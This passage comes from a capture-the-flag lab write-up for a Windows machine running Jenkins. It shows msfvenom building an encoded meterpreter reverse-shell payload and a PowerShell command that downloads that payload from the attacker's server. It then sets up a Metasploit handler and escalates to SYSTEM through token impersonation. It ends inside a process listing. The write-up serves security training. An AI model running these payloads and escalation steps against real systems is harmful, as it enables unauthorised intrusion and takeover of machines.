+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6555</span> -f exe -o payload.exe
+</code></pre></div><p>After running that command we get the following back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6555</span> -f exe -o payload.exe
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Found <span style="color:#ae81ff">1</span> compatible encoders
+Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">368</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">368</span>
+Payload size: <span style="color:#ae81ff">368</span> bytes
+Final size of exe file: <span style="color:#f92672">{</span>ANSWER<span style="color:#f92672">}</span> bytes
+Saved as: payload.exe
+</code></pre></div><p>The rest of the plan follows the same approach we already did for  [Part 1]. We&rsquo;ll create a new PowerShell command to be added to the Jenkins job but this time we don&rsquo;t need the PS script as we&rsquo;ll be using the <strong>payload.exe</strong> that we just generated so the command varies a bit.</p>
+<p>In my case that command would look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell <span style="color:#e6db74">&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.13.0.34:8000/payload.exe&#39;,&#39;payload.exe&#39;)&#34;</span>
+</code></pre></div><p>We&rsquo;ll also need to setup a <strong>multi handler</strong> in <strong>Metasploit</strong> to listen for our <strong>payload.exe</strong> reverse shell connection.</p>
+<p>In our terminal let&rsquo;s start <strong>msfconsole</strong> to fire up <strong>Metasploit</strong> and create our listener.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfconsole
+                                                  
+<span style="color:#75715e"># cowsay++</span>
+ ____________
+&lt; metasploit &gt;
+ ------------
+       <span style="color:#ae81ff">\ </span>  ,__,
+        <span style="color:#ae81ff">\ </span> <span style="color:#f92672">(</span>oo<span style="color:#f92672">)</span>____
+           <span style="color:#f92672">(</span>__<span style="color:#f92672">)</span>    <span style="color:#f92672">)</span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>              <span style="color:#f92672">||</span>--<span style="color:#f92672">||</span> *
+
+
+       <span style="color:#f92672">=[</span> metasploit v5.0.101-dev                         <span style="color:#f92672">]</span>
++ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">2049</span> exploits - <span style="color:#ae81ff">1108</span> auxiliary - <span style="color:#ae81ff">344</span> post       <span style="color:#f92672">]</span>
++ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">562</span> payloads - <span style="color:#ae81ff">45</span> encoders - <span style="color:#ae81ff">10</span> nops            <span style="color:#f92672">]</span>
++ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">7</span> evasion                                       <span style="color:#f92672">]</span>
+
+Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services
+
+msf5 &gt; 
+
+</code></pre></div><p>Here you can type <strong>search multi handler</strong> to locate the exploit we need and <strong>show payloads</strong> to select the right payload for it. For simplicity these are the right ones to use as instructed by the room itself:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/multi/handler
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
+</code></pre></div><p>Then we select the right payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
+</code></pre></div><p>Now you can type in <strong>show options</strong> to see which options are required for us to set, in order to run the exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options
+
+Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+   LHOST                      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style="color:#ae81ff">0</span>   Wildcard Target
+
+</code></pre></div><p>As we can see, we just need to set <strong>[LHOST]</strong> and <strong>[LPORT]</strong> to the right values, let&rsquo;s do that.  And type in <strong>exploit</strong> or <strong>run</strong> to start our <strong>Metasploit listener/handler</strong>.</p>
+<blockquote>
+<p>Make sure to set the <strong>[LPORT]</strong> to the port you specified when creating the <strong>payload.exe</strong> with <strong>msfvenom</strong>.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 10.13.0.34
+LHOST <span style="color:#f92672">=</span>&gt; 10.13.0.34
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">6555</span>
+LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">6555</span>
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:6555 
+</code></pre></div><p>Now let&rsquo;s update that Jenkins Job build command with our payload.</p>
+<p><img src="https://i.imgur.com/varPI6i.png" alt="we paste our new PS command to load our new payload">
+Save the changes and again, trigger a new build as we did before. But unlike the previous deployed build in this case the exploit will just upload our payload to the server and we&rsquo;ll use our existing reverse shell from [Task 1] to execute it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Windows PowerShell running as user bruce on ALFRED
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files (x86)\Jenkins\workspace\project&gt;dir
+
+
+Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Program Files (x86)\Jenkins\workspace\project
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         8/16/2020   3<span style="color:#960050;background-color:#1e0010">:</span>17 PM      73802 payload.exe     
+</code></pre></div><p>We can see our payload got uploaded correctly. Let&rsquo;s run it now.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Windows PowerShell running as user bruce on ALFRED
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files (x86)\Jenkins\workspace\project&gt;Start-Process <span style="color:#e6db74">&#34;payload.exe&#34;</span>   
+</code></pre></div><p>Once our payload runs, we see our <strong>meterpreter</strong> session gets created:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:6555 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">176195</span> bytes<span style="color:#f92672">)</span> to 10.10.177.5
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.13.0.34:6555 -&gt; 10.10.177.5:49213<span style="color:#f92672">)</span> at 2020-08-16 18:32:18 -0400
+
+meterpreter &gt; 
+
+</code></pre></div><p>We successfully switched from a basic shell to a <strong>meterpreter</strong> shell. This concludes [Task 2].</p>
+<h2 id="task-3---privilege-escalation">[Task 3] - Privilege Escalation</h2>
+<p>To solve this last task we&rsquo;ll have to leverage the <strong>token impersonation</strong> technique. The room itself goes into a bit of detail of what it is and how it works. Let&rsquo;s just skip to how to exploit it before this write-up gets any longer.</p>
+<p>We need to use the <strong>whoami /priv</strong> command to see the permissions we have for the user <strong>bruce</strong>. Let&rsquo;s run that command in our reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+<span style="color:#f92672">===============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>
+SeIncreaseQuotaPrivilege        Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt; 
+
+</code></pre></div><p>We get that <strong>SeDebugPrivilege</strong> and <strong>SeImpersonatePrivilege</strong> are <strong>Enabled.</strong> Just what we need.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SeDebugPrivilege                Debug programs                            Enabled 
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+</code></pre></div><p>Back to our <strong>meterpreter</strong> reverse shell, let&rsquo;s load the <strong>incognito</strong> module that would let us exploit those privileges. Then we run <strong>list_tokens -g</strong> to see the available tokens.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; load incognito
+Loading extension incognito...Success.
+meterpreter &gt; list_tokens -g
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self <span style="color:#66d9ef">if</span> primary process token is SYSTEM
+
+Delegation Tokens Available
+<span style="color:#f92672">========================================</span>
+<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>BUILTIN<span style="color:#ae81ff">\A</span>dministrators
+BUILTIN<span style="color:#ae81ff">\I</span>IS_IUSRS
+BUILTIN<span style="color:#ae81ff">\U</span>sers
+NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users
+NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication
+NT AUTHORITY<span style="color:#ae81ff">\S</span>ERVICE
+NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization
+NT AUTHORITY<span style="color:#ae81ff">\W</span>RITE RESTRICTED
+NT SERVICE<span style="color:#ae81ff">\A</span>ppHostSvc
+NT SERVICE<span style="color:#ae81ff">\A</span>udioEndpointBuilder
+NT SERVICE<span style="color:#ae81ff">\B</span>FE
+NT SERVICE<span style="color:#ae81ff">\C</span>ertPropSvc
+NT SERVICE<span style="color:#ae81ff">\C</span>scService
+NT SERVICE<span style="color:#ae81ff">\D</span>nscache
+NT SERVICE<span style="color:#ae81ff">\e</span>ventlog
+NT SERVICE<span style="color:#ae81ff">\E</span>ventSystem
+NT SERVICE<span style="color:#ae81ff">\F</span>DResPub
+NT SERVICE<span style="color:#ae81ff">\i</span>phlpsvc
+NT SERVICE<span style="color:#ae81ff">\L</span>anmanServer
+NT SERVICE<span style="color:#ae81ff">\M</span>MCSS
+NT SERVICE<span style="color:#ae81ff">\P</span>caSvc
+NT SERVICE<span style="color:#ae81ff">\P</span>lugPlay
+NT SERVICE<span style="color:#ae81ff">\R</span>pcEptMapper
+NT SERVICE<span style="color:#ae81ff">\S</span>chedule
+NT SERVICE<span style="color:#ae81ff">\S</span>ENS
+NT SERVICE<span style="color:#ae81ff">\S</span>essionEnv
+NT SERVICE<span style="color:#ae81ff">\S</span>pooler
+NT SERVICE<span style="color:#ae81ff">\T</span>rkWks
+NT SERVICE<span style="color:#ae81ff">\U</span>mRdpService
+NT SERVICE<span style="color:#ae81ff">\U</span>xSms
+NT SERVICE<span style="color:#ae81ff">\W</span>inDefend
+NT SERVICE<span style="color:#ae81ff">\W</span>inmgmt
+NT SERVICE<span style="color:#ae81ff">\W</span>Search
+NT SERVICE<span style="color:#ae81ff">\w</span>uauserv
+
+Impersonation Tokens Available
+<span style="color:#f92672">========================================</span>
+NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK
+NT SERVICE<span style="color:#ae81ff">\A</span>udioSrv
+NT SERVICE<span style="color:#ae81ff">\C</span>ryptSvc
+NT SERVICE<span style="color:#ae81ff">\D</span>comLaunch
+NT SERVICE<span style="color:#ae81ff">\D</span>hcp
+NT SERVICE<span style="color:#ae81ff">\D</span>PS
+NT SERVICE<span style="color:#ae81ff">\L</span>anmanWorkstation
+NT SERVICE<span style="color:#ae81ff">\l</span>mhosts
+NT SERVICE<span style="color:#ae81ff">\M</span>psSvc
+NT SERVICE<span style="color:#ae81ff">\n</span>etprofm
+NT SERVICE<span style="color:#ae81ff">\N</span>laSvc
+NT SERVICE<span style="color:#ae81ff">\n</span>si
+NT SERVICE<span style="color:#ae81ff">\P</span>olicyAgent
+NT SERVICE<span style="color:#ae81ff">\P</span>ower
+NT SERVICE<span style="color:#ae81ff">\S</span>hellHWDetection
+NT SERVICE<span style="color:#ae81ff">\T</span>ermService
+NT SERVICE<span style="color:#ae81ff">\W</span>32Time
+NT SERVICE<span style="color:#ae81ff">\W</span>diServiceHost
+NT SERVICE<span style="color:#ae81ff">\W</span>inHttpAutoProxySvc
+NT SERVICE<span style="color:#ae81ff">\w</span>scsvc
+
+meterpreter &gt; 
+</code></pre></div><p>We can see that the token <strong>BUILTIN\Administrators</strong> is available. Let&rsquo;s impersonate that token by running the following in our <strong>meterpreter</strong> session.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; impersonate_token <span style="color:#e6db74">&#34;BUILTIN\Administrators&#34;</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self <span style="color:#66d9ef">if</span> primary process token is SYSTEM
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Delegation token available
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully impersonated user NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+meterpreter &gt; 
+</code></pre></div><p>Once the impersonation is done we type another command to get the UID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
+Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</code></pre></div><p>As we can see we successfully managed to impersonate <strong>NT AUTHORITY\SYSTEM</strong>.</p>
+<p>Now we can answer the room&rsquo;s question:</p>
+<blockquote>
+<p>Question #3: What is the output when you run the <em>getuid</em> command?</p>
+</blockquote>
+<p>Even though we managed to impersonate successfully, this actually won&rsquo;t allow us to fully have the permissions of a privileged  user. So, we need to fix that.</p>
+<p>We can try to migrate our process to any other that is running with higher privileges, for that we&rsquo;ll use the <strong>ps</strong> command to get the list of running processes and identify one that suits our needs and finally <strong>migrate PID</strong> to migrate to such process.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; ps
+
+Process List
+<span style="color:#f92672">============</span>
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#f92672">[</span>System Process<span style="color:#f92672">]</span>                                                   
+ <span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">0</span>     System                x64   <span style="color:#ae81ff">0</span>                                      
+ <span style="color:#ae81ff">396</span>   <span style="color:#ae81ff">4</span>     smss.exe              x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>mss.exe
+ <span style="color:#ae81ff">524</span>   <span style="color:#ae81ff">516</span>   csrss.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
+ <span style="color:#ae81ff">572</span>   <span style="color:#ae81ff">564</span>   csrss.exe             x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
+ <span style="color:#ae81ff">580</span>   <span style="color:#ae81ff">516</span>   wininit.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>ininit.exe
+ <span style="color:#ae81ff">608</span>   <span style="color:#ae81ff">564</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe
+ <span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">580</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe
+ <span style="color:#ae81ff">676</span>   <span style="color:#ae81ff">580</span>   lsass.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sass.exe
+ <span style="color:#ae81ff">684</span>   <span style="color:#ae81ff">580</span>   lsm.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sm.exe
+ <span style="color:#ae81ff">776</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">792</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">852</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">924</span>   <span style="color:#ae81ff">608</span>   LogonUI.exe           x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\L</span>ogonUI.exe
+ <span style="color:#ae81ff">944</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">992</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">1016</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">1076</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">1188</span>  <span style="color:#ae81ff">668</span>   spoolsv.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>poolsv.exe
+ <span style="color:#ae81ff">1220</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">1236</span>  <span style="color:#ae81ff">524</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
+ <span style="color:#ae81ff">1328</span>  <span style="color:#ae81ff">668</span>   amazon-ssm-agent.exe  x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\S</span>SM<span style="color:#ae81ff">\a</span>mazon-ssm-agent.exe
+ <span style="color:#ae81ff">1436</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">1480</span>  <span style="color:#ae81ff">668</span>   LiteAgent.exe         x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\X</span>entools<span style="color:#ae81ff">\L</span>iteAgent.exe
+ <span style="color:#ae81ff">1508</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">1612</span>  <span style="color:#ae81ff">2160</span>  powershell.exe        x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\W</span>indowsPowerShell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\p</span>owershell.exe
+ <span style="color:#ae81ff">1652</span>  <span style="color:#ae81ff">668</span>   jenkins.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\j</span>enkins.exe
+ <span style="color:#ae81ff">1744</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+ <span style="color:#ae81ff">1820</span>  <span style="color:#ae81ff">1652</span>  java.exe              x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\j</span>re<span style="color:#ae81ff">\b</span>in<span style="color:#ae81ff">\j</span>ava.exe
+ <span style="color:#ae81ff">1860</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
